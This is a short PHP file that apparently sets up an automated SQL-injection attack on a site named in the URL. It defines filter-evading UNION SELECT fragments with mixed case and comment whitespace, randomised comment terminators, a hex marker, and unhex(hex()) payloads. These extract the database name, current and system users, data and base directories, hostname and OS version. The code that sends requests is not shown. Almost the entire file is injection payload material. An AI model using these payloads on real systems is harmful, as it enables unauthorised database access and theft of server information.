<?php

$site = isset($_GET['site'])? $_GET['site']: null;
$whitespace = "/**/";
$loopstart = 1;
$loopend = 100;
$param = "{$whitespace}and{$whitespace}0x7b{$whitespace}={$whitespace}0x7F";
$unisel = "UnION/**/disTincT/**/SELeCt";
$hex = "0x6833786a3363743072,";
$comment=array(1=>"--",2=>"#",3=>"");
$rancom = rand(1,3);
$strsearch="hexon";
$from = "FrOm";

$dbv4 = "uNhEx(hEx(daTAbAse()))";
$dbv5 = "uNhEx(hEx(scHemA())";

$userv4 = "uNhEx(hEx(CurRenT_uSeR()))";
$userv5 = array(1=>"uNhEx(hEx(CurRenT_uSeR))",2=>"uNhEx(hEx(CurRenT_uSeR()))",3=>"uNhEx(hEx(sEssiON_uSeR()))",4=>"uNhEx(hEx(SysTeM_USER()))");

$randuserv5 = rand(1,4);

$basedir = "uNhEx(hEx(@@baSedIR())";
$datadir = "uNhEx(hEx(@@daTAdIR())";

$hostname = "uNhEx(hEx(@@hOsTnaME))";

$osversion = "uNhEx(hEx(@@version_compile_os))";

?>